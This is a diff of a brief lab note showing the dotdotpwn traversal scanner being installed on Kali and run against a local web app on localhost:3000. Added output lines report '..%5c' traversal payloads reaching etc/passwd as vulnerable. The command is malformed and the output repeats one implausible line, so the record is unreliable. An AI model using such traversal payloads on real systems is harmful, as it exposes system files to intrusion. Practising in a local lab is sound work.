@@ -1,4 +1,5 @@
 # it is automated tool to find vulnerability 
+
 (kalikali)-[~]
 > sudo apt-get install dotdotpwn
 [sudo] password for kali:
@@ -10,3 +11,7 @@ dotdotpwn is already the newest version (3.0.2-0kali1).
 
 (kalikali)-[-]
 > sudo dotdotpwn -m httplocalhost:3000/#/login
+[*] Testing Path: http://localhost:3000/#/login:80/..%5c..%5c..%5c..%5cetc%5cpasswd VULNERABLE
+[*] Testing Path: http://localhost:3000/#/login:80/..%5c..%5c..%5c..%5cetc%5cpasswd VULNERABLE
+[*] Testing Path: http://localhost:3000/#/login:80/..%5c..%5c..%5c..%5cetc%5cpasswd VULNERABLE
+
